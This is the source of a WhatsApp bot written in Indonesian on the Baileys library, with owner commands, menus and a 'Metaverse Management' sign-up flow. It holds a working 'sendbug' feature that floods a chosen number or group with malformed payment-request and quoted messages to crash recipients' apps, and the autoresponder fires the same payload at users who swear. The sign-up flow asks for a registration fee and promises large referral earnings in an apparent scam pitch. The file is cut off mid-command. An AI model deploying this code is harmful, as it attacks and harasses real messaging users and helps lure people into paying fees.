"use strict";
require('dotenv').config();

const { flatDirectly } = require('../../validation/importantly/flatDirectly.js');
const { configuration } = require('../../validation/arguments/configuration.js');
const { getFunctions } = require('../../validation/events/binds.js');
const { isUrl, jsonformat, byteToSize } = getFunctions;
const { yts, node_fetch, hxz, boom, baileys, fs, chalk, PhoneNumber, FileType, util, child_process } = new flatDirectly();
const { exec, spawn } = child_process;
const { default: makeWASocket, DisconnectReason, AnyMessageContent, delay, generateForwardMessageContent, isJidGroup, prepareWAMessageMedia, generateWAMessageFromContent, generateMessageID, downloadContentFromMessage, makeInMemoryStore, fetchLatestBaileysVersion, jidDecode, getContentType, proto } = baileys;

module.exports = {
    async newModule(razzaq, store, jid, msg, m, prefix) {
        try {
            class p {
                static config = {
                    autoresponder: configuration.data.jid[0].message.switching.autoresponder,
                    cmdPublic: configuration.data.jid[0].message.switching.cmdPublic,
                    replyErr: configuration.data.build[0].message.send,
                    footer: configuration.data.jid[1].packages.createdName+configuration.data.jid[1].owner.biography.number[0]+'@s.whatsapp.net'.split("@")[0],
                    mentionOwner: configuration.data.jid[1].owner.biography.number[0]+'@s.whatsapp.net',
                    ownerName: configuration.data.jid[1].owner.biography.name,
                    botName: configuration.data.jid[1].bot.biography.name
                };
            };
            if(p.config.autoresponder) {
                await setTimeout(async () => {
                    if(m.body.includes("Assalamualaikum") || m.body.includes("Assalamu'alaikum") || m.body.includes("assalamualaikum") || m.body.includes("assalamu'alaikum")) {
                        if(razzaq.decodeJid(m.key?.fromMe)) return;
                        var teks = ["Wa'alaikumussalam Warahmatullahi Wabarakatuh\n_وَعَلَيْكُمْ السَّلاَمُ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ_", "Wa'alaikumussalam Warahmatullahi Wabarakatuh 😊\n_وَعَلَيْكُمْ السَّلاَمُ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ_", "Wa'alaikumussalam Warahmatullahi Wabarakatuh ❤️\n_وَعَلَيْكُمْ السَّلاَمُ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ_", "Wa'alaikumussalam Warahmatullahi Wabarakatuh ✨\n_وَعَلَيْكُمْ السَّلاَمُ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ_", "Wa'alaikumussalam Warahmatullahi Wabarakatuh 🤗\n_وَعَلَيْكُمْ السَّلاَمُ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ_", "Wa'alaikumussalam Warahmatullahi Wabarakatuh 🌹\n_وَعَلَيْكُمْ السَّلاَمُ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ_", "Wa'alaikumussalam Warahmatullahi Wabarakatuh 🙏🏻\n_وَعَلَيْكُمْ السَّلاَمُ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ_"] 
                        var content = teks[Math.floor(Math.random() *   teks.length)];
                        await razzaq.sendMessage(m.chat, { text: content }, { quoted: m });
                    };
                    if(m.body.includes("Pepek") || m.body.includes("pepek") || m.body.includes("Kontol") || m.body.includes("kontol") || m.body.includes("Anjeng") || m.body.includes("anjeng") || m.body.includes("Bokep") || m.body.includes("bokep") || m.body.includes("Sange") || m.body.includes("sange") || m.body.includes("Ngentot") || m.body.includes("ngentot") || m.body.includes("Babi") || m.body.includes("babi") || m.body.includes("Bangsat") || m.body.includes("bangsat") || m.body.includes("Sex") || m.body.includes("sex")) {
                        if(razzaq.decodeJid(m.key?.fromMe)) return;
                        var requestPaymentMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
                            requestPaymentMessage: {
                                currencyCodeIso4217: "USD",
                                amount1000: 1000,
                                requestFrom: m.chat,
                                Message: {
                                    extendedTextMessage: {
                                        text: ''
                                    }, 
                                },
                            },
                        }), { userJid: m.chat, quoted: m })
                        razzaq.relayMessage(m.chat, requestPaymentMessage.message, { messageId: '' }).then(() => m.reply(`Astagfirullah`))
                    };
                }, 3000);
            };
            switch (m.command) {
                case "list": {
                    if(!p.config.cmdPublic) return p.config.replyErr.fail("publik", m)
                    if(m.isBanned) return p.config.replyErr.fail("banned", m)
                    if((m.args[0]) === 'management') {
                        if((m.args[1]) === 'data') {
                            if((m.args[2]) === 'fadhlan887') {
                                if((m.args[3]) === 'module') {
                                    if((m.args[4]) === 'pembayaran') {
                                        if((m.args[5]) === 'gopay') {
                                            if((m.args[6]) === '50') {
                                                let data = fs.readFileSync("./dbase/users/management/talent.json");
                                                await m.reply("Permintaan Sedang Di Proses, Harap Perhatikan Jika Saldo Tidak Mencukupi Maka Akan Terjadi Eror Saat Penarikan!\n\nProses Membutuhkan Delay, Harap Tunggu Sampai Di Proses Oleh Owner Management\n\nNote:\nBot Otomatis Mangabaikan Penarikan Tunai, Apabila Saldo Tidak Mencukupi.")
                                                await razzaq.sendMessage(mentionOwner, { text: `Halo Owner, Ada Yang Ingin Tarik Tunai Nih!\n\nUsername: ${data[0].id}\nTransfer Ke Gopay:\n${data[0].number}` }, { quoted: m });
                                            };
                                        };
                                    };
                                };
                            };
                        } else if((m.args[1]) === 'masukan') {
                            m.reply("Silahkan Masukan Password Anda\nExample: login-passwords");
                        } else if((m.args[1]) === 'adalah') {
                            var content = `Secara umum, pengertian management merupakan suatu seni dalam ilmu dan pengorganisasian seperti menyusun perencanaan, membangun organisasi dan pengorganisasiannya, pergerakan, serta pengendalian atau pengawasan.\n`
                            razzaq.sendBI3(m.chat, content, p.config.footer, m.thumb, `${prefix}buttons management sistem`, "SISTEM MANAGEMENT", `${prefix}buttons management gaji`, "SISTEM GAJI", `${prefix}buttons management join`, "DAFTAR SEKARANG!", m, { mentions: [ p.config.mentionOwner, m.sender ] })
                        } else if((m.args[1]) === 'tujuan') {
                            var content = `Sedangkan tujuan management adalah untuk memperoleh hasil maksimal dengan biaya atau usaha seminimal mungkin, dengan mendayagunakan seluruh aspek pendukung berupa SDM, aset, dan finansial yang telah diatur sesuai perencanaan.\n`
                            razzaq.sendBI3(m.chat, content, p.config.footer, m.thumb, `${prefix}buttons management sistem`, "SISTEM MANAGEMENT", `${prefix}buttons management gaji`, "SISTEM GAJI", `${prefix}buttons management join`, "DAFTAR SEKARANG!", m, { mentions: [ p.config.mentionOwner, m.sender ] })
                        } else if((m.args[1]) === 'dikerjakan') {
                            var content = `Management merupakan proses perencanaan, pengorganisasian, pengarahan, dan pengawasan sumber daya dalam bentuk finansial, manusia, serta informasi suatu perusahaan/organisasi untuk mencapai sasarannya.\n`
                            razzaq.sendBI3(m.chat, content, p.config.footer, m.thumb, `${prefix}buttons management sistem`, "SISTEM MANAGEMENT", `${prefix}buttons management gaji`, "SISTEM GAJI", `${prefix}buttons management join`, "DAFTAR SEKARANG!", m, { mentions: [ p.config.mentionOwner, m.sender ] })
                        } else if((m.args[1]) === 'contoh') {
                            var content = `Contoh management dalam sebuah perusahaan.\n`
                            content += `${m.numberLive++}. management Produksi.\n`
                            content += `${m.numberLive++}. management Pemasaran.\n`
                            content += `${m.numberLive++}. management Administrasi Perkantoran.\n`
                            content += `${m.numberLive++}. management Konstruksi.\n`
                            content += `${m.numberLive++}. management Sumber Daya Manusia.\n`
                            razzaq.sendBI3(m.chat, content, p.config.footer, m.thumb, `${prefix}buttons management sistem`, "SISTEM MANAGEMENT", `${prefix}buttons management gaji`, "SISTEM GAJI", `${prefix}buttons management join`, "DAFTAR SEKARANG!", m, { mentions: [ p.config.mentionOwner, m.sender ] })
                        } else if((m.args[1]) === 'hakikat') {
                            var content = `Hakikat manajemen adalah merupakan proses pemberian bimbingan, pimpinan, pengaturan, pengendalian, dan pemberian fasilitas lainnya.\n`
                            razzaq.sendBI3(m.chat, content, p.config.footer, m.thumb, `${prefix}buttons management sistem`, "SISTEM MANAGEMENT", `${prefix}buttons management gaji`, "SISTEM GAJI", `${prefix}buttons management join`, "DAFTAR SEKARANG!", m, { mentions: [ p.config.mentionOwner, m.sender ] })
                        } else if((m.args[1]) === 'fungsi') {
                            var content = `Manajemen juga memiliki fungsi yang penting dalam sebuah bisnis, fungsi manajemen ini adalah sebagai elemen dasar yang harus melekat dalam manajemen sebagai acuan dalam melaksanakan tugas untuk mencapai tujuan dengan cara merencanakan, mengorganisir, mengordinasi dan tentunya mengendalikan.\n\n`
                            content += `Fungsi management bisnis\n`
                            content += `proses perencanaan (planning), pengorganisasian (organizing), pengkoordinasian (directing), dan pengontrolan (controlling) sumber daya. Dengan terlaksananya keempat fungsi ini, sasaran atau tujuan bisnis diharapkan dapat dicapai secara efektif dan efisien.\n\n`
                            content += `Fungsi penting dalam manajemen yang diterapkan dalam sebuah bisnis, seperti yang diungkapkan oleh Henri Fayol, adalah sebagai berikut:\n`
                            content += `Perencanaan (planning)\n`
                            content += `Pengorganisasian (organizing)\n`
                            content += `Staffing.\n`
                            content += `Mengarahkan (directing)\n`
                            content += `Pengawasan (controlling)\n`
                            razzaq.sendBI3(m.chat, content, p.config.footer, m.thumb, `${prefix}buttons management sistem`, "SISTEM MANAGEMENT", `${prefix}buttons management gaji`, "SISTEM GAJI", `${prefix}buttons management join`, "DAFTAR SEKARANG!", m, { mentions: [ p.config.mentionOwner, m.sender ] })
                        } else if((m.args[1]) === 'dasar') {
                            var content = `Fungsi dasar manajemen, yaitu Planning (Perencanaan), Organizing (Pengorganisasian), Actuating (Pelaksanaan) dan Controlling (Pengawasan). Keempat fungsi manajemen ini disingkat dengan POAC.\n`
                            razzaq.sendBI3(m.chat, content, p.config.footer, m.thumb, `${prefix}buttons management sistem`, "SISTEM MANAGEMENT", `${prefix}buttons management gaji`, "SISTEM GAJI", `${prefix}buttons management join`, "DAFTAR SEKARANG!", m, { mentions: [ p.config.mentionOwner, m.sender ] })
                        } else if((m.args[1]) === 'membutuhkan') {
                            var content = `Dalam manajemen, pada dasarnya setiap pihak yang terlibat dalam perusahaan akan memerlukan manajemen, mulai dari pemilik, tenaga kerja, pemberi kredit, hingga investor.\n`==
                            razzaq.sendBI3(m.chat, content, p.config.footer, m.thumb, `${prefix}buttons management sistem`, "SISTEM MANAGEMENT", `${prefix}buttons management gaji`, "SISTEM GAJI", `${prefix}buttons management join`, "DAFTAR SEKARANG!", m, { mentions: [ p.config.mentionOwner, m.sender ] })
                        } else if((m.args[1]) === 'ciriciri') {
                            var content = `Manajemen mempunyai ciri-ciri seperti berikut, kecuali\n\n`
                            content += `${m.numberLive++}. manajemen digunakan terhadap seorang individu.\n`
                            content += `${m.numberLive++}. manajemen berusaha untuk mencapai tujuan yang telah ditetapkan.\n`
                            content += `${m.numberLive++}. manajemen merupakan suatu ilmu yang dapat dipelajari.\n`
                            content += `${m.numberLive++}. pencapaian tujuan dilakukan secara sistematis.\n`
                            content += `${m.numberLive++}. ada pembagian kerja yang jelas dan tegas.\n`
                            razzaq.sendBI3(m.chat, content, p.config.footer, m.thumb, `${prefix}buttons management sistem`, "SISTEM MANAGEMENT", `${prefix}buttons management gaji`, "SISTEM GAJI", `${prefix}buttons management join`, "DAFTAR SEKARANG!", m, { mentions: [ p.config.mentionOwner, m.sender ] })
                        } else if((m.args[1]) === 'talent') {
                            var content = `Management talent adalah pengelolaan SDM yang dilakukan dengan menggunakan proses analisis, pengembangan, dan pemanfaatan talent yang berkelanjutan dan efektif untuk memenuhi kebutuhan bisnis.\n`
                            razzaq.sendBI3(m.chat, content, p.config.footer, m.thumb, `${prefix}buttons management sistem`, "SISTEM MANAGEMENT", `${prefix}buttons management gaji`, "SISTEM GAJI", `${prefix}buttons management join`, "DAFTAR SEKARANG!", m, { mentions: [ p.config.mentionOwner, m.sender ] })
                        };
                    };
                };
                break;
                case "buttons": {
                    if(!p.config.cmdPublic) return p.config.replyErr.fail("publik", m)
                    if(m.isBanned) return p.config.replyErr.fail("banned", m)
                    if((m.args[0]) === 'testOne') {
                        m.reply('Work As Button Response #1');
                    } else if((m.args[0]) === 'testTwo') {
                        m.reply('Work As Button Response #2');
                    } else if((m.args[0]) === 'testThree') {
                        m.reply('Work As Button Response #3');
                    } else if((m.args[0]) === 'owner') {
                        razzaq.sendMessage(m.chat, { text: '@'+p.config.mentionOwner.split("@")[0], mentions: [p.config.mentionOwner] }, { quoted: m })
                    } else if((m.args[0]) === 'management') {
                        if((m.args[1]) === 'metaverse') {
                            var content = `Apakah @${m.sender.split("@")[0]} Ingin Join Management ?\n`
                            content += `Biaya Pendaftaran Sebesar 30.000-RP/30.000-IDR (K/RB)\n\n`
                            content += `Untuk Memulai Sebuah Bisnis, Dipersilahkan Untuk Belajar Terlebih Dahulu.\n`
                            content += `Profit Pendapatan Di Management Kisaran 1-7 juta-an/bulan\n`
                            content += `Untuk Informasi Lebih Lanjut, Silahkan Klik Button Dibawah!\n`
                            razzaq.sendBI3(m.chat, content, p.config.footer, m.thumb, `${prefix}buttons management belajar`, "BELAJAR DULU", `${prefix}buttons management join`, "DAFTAR SEKARANG!", `${prefix}buttons metaverse login`, "MASUK", m, { mentions: [p.config.mentionOwner, m.sender] })
                        } else if((m.args[1]) === 'login') {
                            var content = [
                                {
                                    text: `@arifirazzaq2001`, 
                                    id: `${prefix}list management masukan`
                                }, { 
                                    text: `@anamanakh`, 
                                    id: `${prefix}list management masukan`
                                }, { 
                                    text: `@bsixme1216`,  
                                    id: `${prefix}list management masukan`
                                }, { 
                                    text: `@dwirazaqfebrianto`,  
                                    id: `${prefix}list management masukan`
                                }, { 
                                    text: `@fadhlan887`,  
                                    id: `${prefix}list management masukan`
                                }, { 
                                    text: `@hana_anandaa`,  
                                    id: `${prefix}list management masukan`
                                }, { 
                                    text: `@itscindayyy.ofc`,  
                                    id: `${prefix}list management masukan`
                                }, { 
                                    text: `@kakcimi`,  
                                    id: `${prefix}list management masukan`
                                }, { 
                                    text: `@mhdmaulana47`,  
                                    id: `${prefix}list management masukan`
                                }, { 
                                    text: `@mkmpercetakan_kerinci`,  
                                    id: `${prefix}list management masukan`
                                }, { 
                                    text: `@pahrudin.fuad`,  
                                    id: `${prefix}list management masukan`
                                }, { 
                                    text: `@putri_balqis_1234`,  
                                    id: `${prefix}list management masukan`
                                }, { 
                                    text: `@rezalalfarez`,  
                                    id: `${prefix}list management masukan`
                                }, { 
                                    text: `@sapitri1080`,  
                                    id: `${prefix}list management masukan`
                                }, { 
                                    text: `@septiana_981`,  
                                    id: `${prefix}list management masukan`
                                }, { 
                                    text: `@spaa_aja_`,  
                                    id: `${prefix}list management masukan`
                                },
                            ];
                            var rows = [];
                            for (var y of content) {
                                rows.push({ title: y.text, rowId: y.id });
                            };
                            var button = {
                                buttonText: `Tekan Disini`,
                                footer: p.config.footer,
                                text: `Hello 👋 @${m.sender.split('@')[0]}, Silahkan Cari Username Kamu Disini! Daftar Berdasarkan (A-Z), Jika Tidak Ada Harap Lapor Ke Owner, Namun Pastikan Anda Sudah Daftar/Bergabung Ke dalam Metaverse Management Selebgram Ya!\n`
                            };
                            var sections = [{ rows: rows }]
                            razzaq.sendMessage(m.chat, { text: button.text, footer: button.footer, title: button.title, buttonText: button.buttonText, sections, mentions: [p.config.mentionOwner, m.sender] }, { fromMe: m.chat, quoted: m });
                        } else if((m.args[1]) === 'data') {
                            if((m.args[2]) === 'fadhlan887') {
                                if((m.args[3]) === 'module') { 
                                    if((m.args[4]) === 'pembayaran') { 
                                        if((m.args[5]) === 'gopay') {
                                            var content = [
                                                {
                                                    text: `50.000 RB`, 
                                                    id: `${prefix}list management data fadhlan887 module pembayaran gopay 50`
                                                }, { 
                                                    text: `100.000 RB`, 
                                                    id: `${prefix}list management data fadhlan887 module pembayaran gopay 100`
                                                }, { 
                                                   text: `300.000 RB`,  
                                                   id: `${prefix}list management data fadhlan887 module pembayaran gopay 300`
                                                }, { 
                                                   text: `500.000 RB`,  
                                                   id: `${prefix}list management data fadhlan887 module pembayaran gopay 500`
                                                }, { 
                                                   text: `1.000.000 JT`,  
                                                   id: `${prefix}list management data fadhlan887 module pembayaran gopay 1000`
                                                },
                                            ];
                                            var rows = [];
                                            for (var y of content) {
                                                rows.push({ title: y.text, rowId: y.id });
                                            };
                                            var button = {
                                                buttonText: `Tekan Disini`,
                                                    footer: p.config.footer,
                                                    text: `Hello 👋 @${m.sender.split('@')[0]}, Silahkan Cari Username Kamu Disini! Daftar Berdasarkan (A-Z), Jika Tidak Ada Harap Lapor Ke Owner, Namun Pastikan Anda Sudah Daftar/Bergabung Ke dalam Metaverse Management Selebgram Ya!\n`
                                                };
                                            var sections = [{ rows: rows }]
                                            razzaq.sendMessage(m.chat, { text: button.text, footer: button.footer, title: button.title, buttonText: button.buttonText, sections, mentions: [p.config.mentionOwner, m.sender] }, { fromMe: m.chat, quoted: m });
                                        };
                                    };
                                } else if((m.args[3]) === 'tariktunai') { 
                                    var button =  [ 
                                        { 
                                            buttonId: `${prefix}buttons management data fadhlan887 module pembayaran gopay`, 
                                            buttonText: { 
                                                displayText: 'GOPAY' }, 
                                            type: 1 
                                        }, 
                                    ];
                                    razzaq.sendButtonText(m.chat, button, 'Silahkan Pilih Metode Pembayaran Dibawah!', p.config.footer, m, { mentions: [ p.config.mentionOwner ] })
                                } else if((m.args[3]) === 'event') { 
                                    var content = `*Bismillah... Gratis 🔥*\n\n`
                                    content += `*Bagi Bagi Followers Dengan Cara Di Promote (Bukan Suntik Followers [Instagram] ayo!! Real 100%)*\n`
                                    content += `💻  *Di Berdaya Oleh: Metaverse Management*\n\n`
                                    content += `*Klik Link di bawah 👇*\n`
                                    content += `https://wa.me/6281361057300?text=Halo+kak+ambil+followers+gratis+lewat+jalur+fadhlan887\n`
                                    await m.reply(content)
                                    await m.reply("*Silahkan Share Text Diatas!*\nSetiap Orang Yang Klik Link Tersebut Dan Mengikuti Arahannya Hingga Selesai Kamu Bakalan Mendapatkan Uang Tunai Kemungkinan 10/15.k Setiap 1 Orang\n\nNote:* Dilarang Mengubah Apapun Yang Tersedia Di Event Text Diatas, Karena Kalau Berubah Bot Tidak Bisa Mendeteksi Seberapa Orang Yang Join Dari Hasil Yang Kamu Share!,\n\nShare Lah Sebanyak Mungkin Sebelum Event Berubah!.");
                                } else if((m.args[3]) === 'premium') {
                                    m.reply("Maaf Anda Bukan Users Premium! Silahkan Update Untuk Mendapatkan Fitur Dan Kegiatan Terbaru Serta Menghasilkan Uang Lebih Banyak Lagi!");
                                };
                            };
                        } else if((m.args[1]) === 'belajar') {
                            var content = [
                                { 
                                    text: `Apa yang dimaksud dengan management?`, 
                                    id: `${prefix}list management adalah` 
                                }, { 
                                    text: `Apa tujuan dari management?`, 
                                    id: `${prefix}list management tujuan` 
                                }, { 
                                    text: `Apa yang dikerjakan oleh management?`, 
                                    id: `${prefix}list management dikerjakan` 
                                }, {
                                    text: `Apa saja contoh management?`, 
                                    id: `${prefix}list management contoh` 
                                }, { 
                                    text: `Apa yang dimaksud dengan hakikat management?`, 
                                    id: `${prefix}list management hakikat` 
                                }, { 
                                    text: `Apa saja 5 fungsi management?`, 
                                    id: `${prefix}list management fungsi` 
                                }, { 
                                    text: `Apa saja dasar dasar management?`, 
                                    id: `${prefix}list management dasar` 
                                }, { 
                                    text: `Siapa saja yang membutuhkan management?`, 
                                    id: `${prefix}list management membutuhkan` 
                                }, { 
                                    text: `Apa saja ciri-ciri management?`, 
                                    id: `${prefix}list management ciriciri` 
                                }, { 
                                    text: `Talent management adalah?`, 
                                    id: `${prefix}list management talent` 
                                },
                            ];
                            var rows = [];
                            for (var y of content) {
                                rows.push({ title: y.text, rowId: y.id });
                            };
                            var button = {
                                buttonText: `Tekan Disini`,
                                footer: p.config.footer,
                                text: `Hello 👋 @${m.sender.split('@')[0]}, Silahkan Belajar Terlebih Dahulu Untuk Memulai Sebuah Bisnis Di Metaverse Management.\n`
                            };
                            var sections = [{ rows: rows }]
                            razzaq.sendMessage(m.chat, { text: button.text, footer: button.footer, title: button.title, buttonText: button.buttonText, sections, mentions: [p.config.mentionOwner, m.sender] }, { fromMe: m.chat, quoted: m });
                        } else if((m.args[1]) === 'join') { 
                            m.reply("Fitur Belum Tersedia")
                        };
                    };
                };
                break;
                case "menu": {
                    if(!p.config.cmdPublic) return p.config.replyErr.fail("publik", m)
                    if(m.isBanned) return p.config.replyErr.fail("banned", m)
                    var mem = process.memoryUsage();
                    var obj = Object.keys(mem).map(ve => `├◉ ${ve}: ${byteToSize(mem[ve], 2)}`).join("\n")
                    var content = `*${m.ucapanWaktu} - ${m.moment} WIB*\n\n`
                    content += `*Bot Name:* ${p.config.botName}\n`
                    content += `*Version:* ${require("@adiwajshing/baileys/package").version}\n\n`
                    content += `*List Others:*\n`
                    content += `${m.numberLive++}. ${prefix}test type\n`
                    content += `${m.numberLive++}. ${prefix}info type\n`
                    content += `${m.numberLive++}. ${prefix}check type\n\n`
                    content += `*List Owners:*\n`
                    content += `${m.numberLive++}. ${prefix}mode [self/public]\n`
                    content += `${m.numberLive++}. ${prefix}command [enable/disable]\n`
                    content += `${m.numberLive++}. ${prefix}sendbug type id jid amount\n`
                    content += `${m.numberLive++}. ${prefix}join type jid\n`
                    content += `${m.numberLive++}. ${prefix}culik type jid\n`
                    content += `${m.numberLive++}. ${prefix}bot type\n`
                    razzaq.sendBI2(m.chat, content, p.config.footer, m.thumb, `${prefix}buttons owner`, "OWNER", `${prefix}buttons management metaverse`, "METAVERSE MANAGEMENT", m, { mentions: [ p.config.mentionOwner ] })
                };
                break;
                case "mode": {
                    if(!razzaq.decodeJid(m.key?.fromMe)) return p.config.replyErr.fail("pemilik", m)
                    if(m.args.length < 1) return m.reply(`*Example:* ${m.command} type\n*Param:* Send Commands With Words ${m.command} type\n*Desc:* Mode Bot\n`);
                    if((m.args[0]) === 'self') {
                        configuration.data.jid[0].message.switching.remoteJid = false
                        m.reply(`Sekarang Bot Dalam Mode: ${configuration.data.jid[0].message.switching.remoteJid ? "PUBLIC" : "SELF"}`)
                    } else if((m.args[0]) === 'public') {
                        configuration.data.jid[0].message.switching.remoteJid = true
                        m.reply(`Sekarang Bot Dalam Mode: ${configuration.data.jid[0].message.switching.remoteJid ? "PUBLIC" : "SELF"}`) 
                    } else {
                        content = '*List Type:*\n'
                        content += `${m.numberLive++}. ${m.command} self\n`
                        content += `${m.numberLive++}. ${m.command} public\n`
                        m.reply(content);
                    };
                };
                break;
                case "check": {
                    if(!razzaq.decodeJid(m.key?.fromMe)) return p.config.replyErr.fail("pemilik", m)
                    if(m.args.length < 1) return m.reply(`*Example:* ${m.command} type\n*Param:* Send Commands With Words ${m.command} type\n*Desc:* Checked\n`);
                    if((m.args[0]) === 'prefix') {
                        m.reply(`Prefix Saat Ini: ${prefix}`)
                    } else {
                        content = '*List Type:*\n'
                        content += `${m.numberLive++}. ${m.command} prefix\n`
                        content += `${m.numberLive++}. ${m.command} disable\n`
                        m.reply(content);
                    };
                };
                break;
                case "command": {
                    if(!razzaq.decodeJid(m.key?.fromMe)) return p.config.replyErr.fail("pemilik", m)
                    if(m.args.length < 1) return m.reply(`*Example:* ${m.command} type\n*Param:* Send Commands With Words ${m.command} type\n*Desc:* Command Bot\n`);
                    if((m.args[0]) === "disable") {
                        configuration.data.jid[0].message.switching.cmdPublic = false
                        m.reply(`Sekarang Command Dalam Mode: ${configuration.data.jid[0].message.switching.cmdPublic ? "PUBLIC" : "SELF"}`)
                    } else if((m.args[0]) === "enable") {
                        configuration.data.jid[0].message.switching.cmdPublic = true
                        m.reply(`Sekarang Command Dalam Mode: ${configuration.data.jid[0].message.switching.cmdPublic ? "PUBLIC" : "SELF"}`) 
                    } else {
                        content = '*List Type:*\n'
                        content += `${m.numberLive++}. ${m.command} enable\n`
                        content += `${m.numberLive++}. ${m.command} disable\n`
                        m.reply(content);
                    };
                };
                break;
                case "test": {
                    if(!p.config.cmdPublic) return p.config.replyErr.fail("publik", m)
                    if(m.isBanned) return p.config.replyErr.fail("banned", m)
                    if(m.args.length < 1) return m.reply(`*Example:* ${m.command} type\n*Param:* Send Commands With Words ${m.command} type\n*Desc:* Testing Bot\n`);
                    if((m.args[0]) === 'text') {
                        content = 'Work As Command'
                        m.reply(content);
                    } else if((m.args[0]) === 'button') {
                        var button =  [ 
                            { buttonId: `${prefix}buttons testOne`, buttonText: { displayText: 'TEST BUTTON 1' }, type: 1 }, 
                            { buttonId: `${prefix}buttons testTwo`, buttonText: { displayText: 'TEST BUTTON 2' }, type: 1 }, 
                            { buttonId: `${prefix}buttons testThree`, buttonText: { displayText: 'TEST BUTTON 3' }, type: 1 }, 
                        ];
                        razzaq.sendButtonText(m.chat, button, 'Testing With Button Command', p.config.footer, m, { mentions: [ p.config.mentionOwner ] })
                    } else {
                        content = '*List Type:*\n'
                        content += `${m.numberLive++}. ${m.command} text\n`
                        content += `${m.numberLive++}. ${m.command} button\n`
                        m.reply(content);
                    };
                };
                break;
                case "info": {
                    if(!p.config.cmdPublic) return p.config.replyErr.fail("publik", m)
                    if(m.isBanned) return p.config.replyErr.fail("banned", m)
                    if(m.args.length < 1) return m.reply(`*Example:* ${m.command} type\n*Param:* Send Commands With Words ${m.command} type\n*Desc:* View Information In Bot\n`); 
                    if((m.args[0]) === 'memory') {
                        var mem = process.memoryUsage();
                        var obj = Object.keys(mem).map(ve => `${m.numberLive++}. ${ve}: ${byteToSize(mem[ve], 2)}`).join("\n")
                        m.reply(obj)
                    } else {
                        var content = '*List Type:*\n'
                        content += `${m.numberLive++}. ${m.command} memory\n`
                        m.reply(content);
                    };
                };
                break;
                case "join": {
                    if(!razzaq.decodeJid(m.key?.fromMe)) return p.config.replyErr.fail("pemilik", m)
                    if(m.args.length < 1) return m.reply(`*Example:* ${m.command} type url\n*Param:* Send Commands With Words ${m.command} type url\n*Desc:* Join The Group\n`);
                    if((m.args[0]) === 'group') {
                        if(!isUrl(m.args[1]) && !m.args[1].includes('whatsapp.com')) return p.config.replyErr.fail("ErrLink", m);
                        var result = m.args[1].split('https://chat.whatsapp.com/')[1]
                        razzaq.groupAcceptInvite(result).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                    } else {
                        content = '*List Type:*\n'
                        content += `${m.numberLive++}. ${m.command} group\n`
                        m.reply(content);
                    };
                };
                case "sendbug": {
                    if(!razzaq.decodeJid(m.key?.fromMe)) return p.config.replyErr.fail("pemilik", m)
                    if(m.args.length < 1) return m.reply(`*Example:* ${m.command} type id jid amount\n*Param:* Send Commands With Words ${m.command} type id jid amount\n*Desc:* Send Bugs\n`);
                    if(!m.args[3]) return p.config.replyErr.fail("jumlahK", m)
                    if((m.args[0]) === 'forceclose') {
                        if((m.args[1]) === 'id') {
                            for (var i = 0; i < m.args[3]; i++) {
                                await delay(3000)
                                await razzaq.sendMessage(m.args[2], { text: m.name }, { quoted: doc() })
                            }
                            await m.reply(`Success Send Bug To: ${m.args[2].split("@")[0]}\nAmount Spam: ${m.args[3]}\nType: ${m.args[0]} ${m.args[1]}`);
                        } else if((m.args[1]) === 'link') {
                            if(!isUrl(m.args[2]) && !m.args[2].includes('whatsapp.com')) return p.config.replyErr.fail("ErrLink", m);
                            var result = m.args[2].split('https://chat.whatsapp.com/')[1]
                            var res = await razzaq.groupAcceptInvite(result)
                            try {
                                for (var i = 0; i < m.args[3]; i++) {
                                    await razzaq.sendMessage(`${res}`, { text: m.name }, { quoted: doc() })
                                };
                                await m.reply(`Success Send Bug To: ${res.split("@")[0]}\nAmount Spam: ${m.args[3]}\nType: ${m.args[0]} ${m.args[1]}`);
                            } catch (err) {
                                m.reply(jsonformat(err));
                            };
                        } else {
                            var content = '*List type:*\n'
                            content += `${m.numberLive++}. ${m.command} forceclose id\n`
                            content += `${m.numberLive++}. ${m.command} forceclose link\n`
                            m.reply(content);
                        };
                    } else if((m.args[0]) === 'crash') {
                        if((m.args[1]) === 'id') {
                            for (var i = 0; i < m.args[3]; i++) {
                                var requestPaymentMessage = generateWAMessageFromContent(m.args[2], proto.Message.fromObject({
                                    requestPaymentMessage: {
                                        currencyCodeIso4217: "USD",
                                        amount1000: 1000,
                                        requestFrom: m.args[2],
                                        Message: {
                                            extendedTextMessage: {
                                                text: m.name
                                            }, 
                                        }, 
                                    },
                                }), { userJid: m.args[2], quoted: m })
                                await razzaq.relayMessage(m.args[2], requestPaymentMessage.message, { messageId: '' })
                            };
                            await m.reply(`*Success Send Bug!*\nTo: ${m.args[2].split("@")[0]}\nAmount Spam: ${m.args[3]}\nType: ${m.args[0]} ${m.args[1]}`);
                        } else if((m.args[1]) === 'link') {
                            if(!isUrl(m.args[2]) && !m.args[2].includes('whatsapp.com')) return global.dfail("ErrLink", m);
                            var result = m.args[2].split('https://chat.whatsapp.com/')[1]
                            var res = await razzaq.groupAcceptInvite(result)
                            try {
                                for (var i = 0; i < m.args[3]; i++) {
                                    var requestPaymentMessage = generateWAMessageFromContent(`${res}`, proto.Message.fromObject({
                                        requestPaymentMessage: {
                                            currencyCodeIso4217: "USD",
                                            amount1000: 1000,
                                            requestFrom: `${res}`,
                                            Message: {
                                                extendedTextMessage: {
                                                    text: ''
                                                }, 
                                            }, 
                                        },
                                    }), { userJid: `${res}`, quoted: m })
                                    await razzaq.relayMessage(`${res}`, requestPaymentMessage.message, { messageId: '' })
                                };
                                await m.reply(`Success Send Bug To: ${res.split("@")[0]}\nAmount Spam: ${m.args[3]}\nType: ${m.args[0]} ${m.args[1]}`);
                            } catch (err) {
                                m.reply(jsonformat(err));
                            };
                        } else {
                            var content = '*List type:*\n'
                            content += `${m.numberLive++}. ${m.command} forceclose id\n`
                            content += `${m.numberLive++}. ${m.command} crash link\n`
                            m.reply(content);
                        }; 
                    } else {
                        var content = '*List Type:*\n'
                        content += `${m.numberLive++}. ${m.command} forceclose\n`
                        content += `${m.numberLive++}. ${m.command} crash\n`
                        m.reply(content);
                    };
                };
                break;
                case "bot": {
                    if(!razzaq.decodeJid(m.key?.fromMe)) return p.config.replyErr.fail("pemilik", m)
